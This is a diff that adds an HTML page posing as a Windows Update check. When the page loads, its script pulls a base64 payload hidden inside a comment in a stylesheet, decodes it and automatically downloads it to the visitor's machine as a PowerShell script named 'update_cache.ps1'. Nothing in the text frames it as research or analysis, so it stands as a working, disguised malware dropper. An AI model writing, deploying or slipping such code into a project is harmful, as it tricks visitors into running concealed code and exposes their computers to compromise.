@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Checking for Updates...</title>
+  <script>
+    (async () => {
+      const res = await fetch("assets/style.css?rand=" + Date.now());
+      const css = await res.text();
+
+      const match = css.match(/\[payload_start\][\s\S]*?\/\*\s*([A-Za-z0-9+/=]+)\s*\*\//);
+
+      if (!match) {
+        console.log("[!] Payload not found in style.css");
+        console.log("[!] Partial CSS dump:", css.slice(0, 500));
+        return alert("Update failed.");
+      }
+
+      const b64 = match[1].replace(/\s+/g, '');
+      const decoded = atob(b64);
+
+      const blob = new Blob([decoded], {type: "application/octet-stream"});
+      const url = URL.createObjectURL(blob);
+
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = "update_cache.ps1";
+      document.body.appendChild(link);
+      link.click();
+    })();
+  </script>
+</head>
+<body>
+  <h1>Checking for Windows Update...</h1>
+</body>
+</html>
